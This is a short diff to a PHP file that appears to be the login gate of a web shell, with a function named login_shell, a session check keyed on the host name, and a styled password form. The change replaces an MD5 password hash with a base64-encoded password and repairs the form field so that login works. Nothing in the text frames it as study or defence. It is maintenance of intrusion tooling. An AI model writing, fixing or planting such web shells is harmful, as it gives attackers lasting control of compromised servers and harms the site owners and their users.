@@ -1,6 +1,6 @@
 <?php
 session_start();
-$password = "ef28192e958946522513f3de903e60ae";
+$password = "Zm9tbw==";
 
 function login_shell()
 {
@@ -112,7 +112,7 @@ input[type="password"]:focus {
     </div>
     <div class="card-body">
         <form action="" method="post" class="py-1 form-floating">
-                <input type="password" class="form-control" id="floatingPassword" placeholder="Password" style="background-color: #333; outline: none;border: 1px solid #ffd000;">
+                <input type="password" name="pass" class="form-control" id="floatingPassword" placeholder="Password" style="background-color: #333; outline: none;border: 1px solid #ffd000;">
                 <label for="floatingPassword" style="color: rgb(206, 207, 208);">Password</label>
             <input type="submit" name="submit" value="Login" class="container">
         </form>
@@ -167,9 +167,9 @@ input[type="password"]:focus {
 <?php
     exit;
 }
-if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
-    if (isset($_POST['pass']) && (md5($_POST['pass']) == $password)) {
-        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
+if (!isset($_SESSION[base64_encode($_SERVER['HTTP_HOST'])])) {
+    if (isset($_POST['pass']) && (base64_encode($_POST['pass']) == $password)) {
+        $_SESSION[base64_encode($_SERVER['HTTP_HOST'])] = true;
         header("refresh: 0;");
     } else {
         login_shell();
